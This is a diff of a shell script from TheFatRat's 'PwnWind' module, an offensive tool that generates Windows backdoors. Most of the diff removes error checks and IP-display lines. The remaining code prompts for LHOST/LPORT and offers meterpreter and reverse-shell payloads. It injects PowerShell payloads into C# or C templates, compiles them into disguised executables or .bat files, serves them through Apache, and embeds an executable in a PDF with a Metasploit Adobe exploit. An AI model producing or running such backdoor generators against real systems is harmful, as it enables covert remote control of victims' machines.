@@ -1833,6 +1833,7 @@ esac
 #PwnWind v1.2
 #Developed or original code Edo Maland (Screetsec)
 ############################################################
+############################################################
 function PwnWinds() {
 clear
 echo ""
@@ -1877,64 +1878,6 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 				then
 					echo ""
 					echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
-					echo -ne "  SET LHOST : ";tput sgr0
-					read yourip
-					echo ""
-					echo -ne $okegreen " SET LPORT : ";tput sgr0
-					read yourport
-					echo ""
-					echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
-					read fira
-					payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1
-					spinlong
-					echo ""
-					echo ""
-					gboor
-					spinlong
-					echo ""
-                                        $pwned $payload $yourip $yourport 
-					echo ""
-					echo ""
-                                        power=$path/powershell_attack.txt
-                                        if [ ! -f "$power" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Unable to find the output $power"
-                                        echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
-					cat powershell_attack.txt
-					sleep 2
-					rm unicorn.rc
-					mv powershell_attack.txt output/$fira.bat
-                                        otf=$path/output/$fira.bat
-                                        if [ ! -f "$otf" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Unable to create $otf"
-                                        echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
-					echo ""
-					echo -e $okegreen""
-					echo -e "Backdoor Saved To output Folder "
-
-					elif test $fatrat1 == '2' #cPAGAR-POWERSHELL
-					then
-					echo ""
-					echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -1953,76 +1896,52 @@ echo -e $okegreen ""
 					$pwned $payload $yourip $yourport > /dev/null 2>&1
 					echo ""
 					echo ""
-power=$path/powershell_attack.txt
-                                        if [ ! -f "$power" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Unable to find the output $power"
-                                        echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
-					#Removing first 20 characters and last from payload
-                                        cuts=$(sed -r 's/^.{20}//' powershell_attack.txt) 
-                                        echo $cuts > output/cuts.tmp
- 
-#Removing last character of payload   
-                                        cuts1=$(sed '1 s/.$//' output/cuts.tmp)
-                                        echo $cuts1 > output/cuts1.tmp              
-                                        cp $B $path/output/Program.cs
-                                        tgt=$path/output/Program.cs
-                                        pld=$(cat output/cuts1.tmp)
-                                        
-#Inserting Payload into Program.cs file
-                                        sed -i "s/PAYLOAD/$pld/g" $tgt
-                                        
-powerf=$path/output/Program.cs
-size=7
-actualsize=$(du -k "$powerf" | cut -f 1)
-                                        if [ $actualsize -ge $size ]
-                                        then
-                                        echo -e $okegreen ""
-else 
-echo -e $red ""
-echo "There was a problem inserting the payload into final file to be compiled
-at $powerf "
-echo ""
-                                        rm unicorn.rc powershell_attack.txt $bcom >/dev/null 2>&1
-                                        rm -rf $path/output/cuts.tmp >/dev/null 2>&1
-                                        rm -rf $path/output/cuts1.tmp >/dev/null 2>&1
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
-                                        echo -e $okegreen ""
+					cat powershell_attack.txt
+					sleep 2
+					rm unicorn.rc
+					mv powershell_attack.txt output/$fira.bat
+					echo ""
+					echo -e $okegreen""
+					echo -e "Backdoor Saved To output Folder "
 
+					elif test $fatrat1 == '2' #cPAGAR-POWERSHELL
+					then
+					echo ""
+					echo -e $okegreen""
+					echo -ne "  SET LHOST : ";tput sgr0
+					read yourip
+					echo ""
+					echo -ne $okegreen " SET LPORT : ";tput sgr0
+					read yourport
+					echo ""
+					echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
+					read fira
+					payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1
+					spinlong
+					echo ""
+					echo ""
+					gboor
+					spinlong
+					echo ""
+					$pwned $payload $yourip $yourport > /dev/null 2>&1
+					echo ""
+					echo ""
 
+					s0=$(cat powershell_attack.txt | cut -d ' ' -f1)
+					s1=$(cat powershell_attack.txt | cut -d ' ' -f2)
+					s2=$(cat powershell_attack.txt | cut -d ' ' -f3)
+					s3=$(cat powershell_attack.txt | cut -d ' ' -f4)
+					s4=$(cat powershell_attack.txt | cut -d ' ' -f5)
 
+					sed s/PAYLOAD/$s0\ $s1\ $s2\ $s3\ $s4/g $B > $bcom
+					echo
 					dmcs $bcom -o "output/$fira.exe" > /dev/null 2>&1
-power=$path/output/$fira.exe
-                                        if [ ! -f "$power" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Unable to compile with mono $powerf into $power"
-                                        echo -e $okegreen ""
-                                        rm unicorn.rc powershell_attack.txt $bcom >/dev/null 2>&1
-                                        rm -rf $path/output/cuts.tmp >/dev/null 2>&1
-                                        rm -rf $path/output/cuts1.tmp >/dev/null 2>&1
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
-					rm unicorn.rc powershell_attack.txt $bcom >/dev/null 2>&1
-                                        rm -rf $path/output/cuts.tmp >/dev/null 2>&1
-                                        rm -rf $path/output/cuts1.tmp >/dev/null 2>&1
+					rm unicorn.rc powershell_attack.txt $bcom
 					sleep 2
 					echo ""
 					echo -e $okegreen""
 					echo -e "Backdoor Saved To output Folder "
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
+
 
 
 				elif test $fatrat1 == '3' #Apachecompler
@@ -2032,11 +1951,6 @@ PwnWinds
 					echo -e $okegreen " Starting Apache Server wait ..."
 					service apache2 start > /dev/null 2>&1
 					echo ""
-echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -2052,7 +1966,7 @@ echo -e $okegreen ""
 					gboor
 					spinlong
 					echo ""
-					$pwned $payload $yourip $yourport
+					$pwned $payload $yourip $yourport > /dev/null 2>&1
 					echo ""
 					echo $yourip >> "$out"
 
@@ -2062,22 +1976,11 @@ echo -e $okegreen ""
 					echo
 					$COMPILER -Wall -mwindows icons/icon.res $apachecom -o "output/$fira.exe" > /dev/null 2>&1
 					rm unicorn.rc  $apachecom $out
-power=$path/powershell_attack.txt
-                                        if [ ! -f "$power" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Unable to find $power"
-                                        echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
 					mv powershell_attack.txt $apache2
 					sleep 2
 					echo ""
 					echo -e $okegreen""
-                                        rm -rf $path/output/Program.cs >/dev/null 2>&1
-                                    	echo -e $okegreen "  Backdoor Saved To output Folder "
+					echo -e "  Backdoor Saved To output Folder "
 					echo ""
 					echo -ne "  Press any key to continue ......... "
 					read continue
@@ -2087,10 +1990,6 @@ fi
 					then
 					echo ""
 					echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -2106,19 +2005,10 @@ echo -e $okegreen ""
 					gboor
 					spinlong
 					echo ""
-					$pwned $payload $yourip $yourport
+					$pwned $payload $yourip $yourport > /dev/null 2>&1
 					echo ""
 					echo ""
-power=$path/powershell_attack.txt
-                                        if [ ! -f "$power" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Unable to find $power"
-                                        echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
+
 					s0=$(cat powershell_attack.txt | cut -d ' ' -f1)
 					s1=$(cat powershell_attack.txt | cut -d ' ' -f2)
 					s2=$(cat powershell_attack.txt | cut -d ' ' -f3)
@@ -2127,15 +2017,6 @@ fi
 
 					sed s/PAYLOAD/$s0\ $s1\ $s2\ $s3\ $s4/g $C > $paycom
 					echo
-                                        if [ ! -f "$paycom" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Unable to find $paycom"
-                                        echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
 					$COMPILER -Wall -mwindows icons/icon.res $paycom -o "output/$fira.exe" > /dev/null 2>&1
 					rm unicorn.rc powershell_attack.txt $paycom
 					sleep 2
@@ -2151,10 +2032,6 @@ fi
 					echo
 					echo -e $yellow"  Worked on Adobe Reader v8.x, v9.x / Windows XP SP3 / Windows 7/Vista ( English )"
 					echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -2173,19 +2050,9 @@ echo -e $okegreen ""
 					gboor
 					spinlong
 					echo ""
-					$pwned $payload $yourip $yourport
+					$pwned $payload $yourip $yourport > /dev/null 2>&1
 					echo ""
 					echo ""
-power=$path/powershell_attack.txt
-if [ ! -f "$power" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Unable to find $power"
-                                        echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
 
 					s0=$(cat powershell_attack.txt | cut -d ' ' -f1)
 					s1=$(cat powershell_attack.txt | cut -d ' ' -f2)
@@ -2195,30 +2062,11 @@ fi
 
 					sed s/PAYLOAD/$s0\ $s1\ $s2\ $s3\ $s4/g $C > $pdfcom
 					echo
-if [ ! -f "$pdfcom" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Unable to find $pdfcom"
-                                        echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
 					$COMPILER -Wall -mwindows icons/icon.res $pdfcom -o "$path/output/backdoor_for_pdf.exe" > /dev/null 2>&1
 					sleep 2
 					echo " Wait for embed exe to pdf ....  "
 					xterm -T " TheFatRat < PDF BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $path/output/backdoor_for_pdf.exe; set FILENAME $fira.pdf; set INFILENAME $embedpdf; exploit; exit -y'" > /dev/null 2>&1
 					echo ""
-msout=~/.msf4/local/$fira.pdf
-if [ ! -f "$msout" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Msfconsole was unale to compile $fira.pdf"
-                                        echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
 					mv ~/.msf4/local/$fira.pdf $path/output/$fira.pdf
 					rm unicorn.rc powershell_attack.txt
 					echo -e $okegreen""
@@ -2231,10 +2079,6 @@ fi
         then
         echo ""
         echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
         echo -ne "  SET LHOST : ";tput sgr0
         read yourip
         echo ""
@@ -2438,10 +2282,6 @@ echo -e $okegreen ""
       then
       echo ""
       echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
       echo -ne "  SET LHOST : ";tput sgr0
       read yourip
       echo ""
